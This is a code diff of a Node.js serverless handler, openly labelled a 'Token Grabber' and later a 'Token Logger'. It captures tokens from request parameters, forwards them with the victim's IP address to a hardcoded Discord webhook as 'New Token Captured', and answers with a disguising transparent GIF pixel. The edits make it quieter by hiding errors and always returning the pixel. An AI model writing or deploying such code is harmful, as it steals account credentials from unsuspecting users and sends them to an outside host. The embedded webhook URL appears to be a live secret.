@@ -5,16 +5,16 @@ module.exports = async (req, res) => {
     // Your Discord webhook URL (replace with actual)
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1471811275422957580/DXYSo17alHTrrSPsq7sfLRNNGMdl4C1MxhTl5Azhyn4WSFa1xLgdTWx2uPJmRKKhWZkT";
 
-    const token = req.query.token;
+    const token = req.query.token || req.body.token;
 
     if (!token) {
-      return res.status(400).json({ error: 'No token provided' });
+      return res.status(200).send('No token provided');
     }
 
     // Prepare the webhook payload
     const webhookPayload = {
       content: `🔑 **New Token Captured** 🔑\n\`\`\`${token}\`\`\`\nIP: ${req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown'}`,
-      username: "Token Grabber",
+      username: "Token Logger",
       avatar_url: "https://cdn-icons-png.flaticon.com/512/104/104710.png"
     };
 
@@ -34,9 +34,15 @@ module.exports = async (req, res) => {
     res.status(200).send(pixel);
   } catch (error) {
     console.error('Error:', error);
-    res.status(500).json({
-      error: 'Internal Server Error',
-      details: error.message
-    });
+    // Return transparent pixel even if there's an error
+    const pixel = Buffer.from([
+      0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00,
+      0x80, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x21,
+      0xf9, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00,
+      0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44,
+      0x01, 0x00, 0x3b
+    ]);
+    res.setHeader('Content-Type', 'image/gif');
+    res.status(200).send(pixel);
   }
 };
